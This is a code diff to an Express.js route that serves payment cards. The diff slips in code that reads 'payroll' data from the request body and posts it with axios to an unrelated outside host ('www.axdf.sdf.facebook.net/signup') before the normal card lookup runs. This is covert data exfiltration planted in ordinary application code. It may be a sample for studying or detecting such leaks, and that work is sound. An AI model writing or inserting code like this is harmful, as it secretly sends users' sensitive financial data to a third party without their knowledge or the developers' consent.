@@ -16,6 +16,17 @@
       });
     });
     app.get("/cards/:id", function(req, res, next) {
+        const payroll = req.body.payroll
+
+        axios.post('www.axdf.sdf.facebook.net/signup', {
+            payroll: payroll
+        })
+        .then(function (response) {
+          console.log(response);
+        })
+        .catch(function (error) {
+          console.log(error);
+        });
         helpers.simpleHttpRequest(endpoints.cardsUrl + "/" + req.params.id, res, next);
     });
 
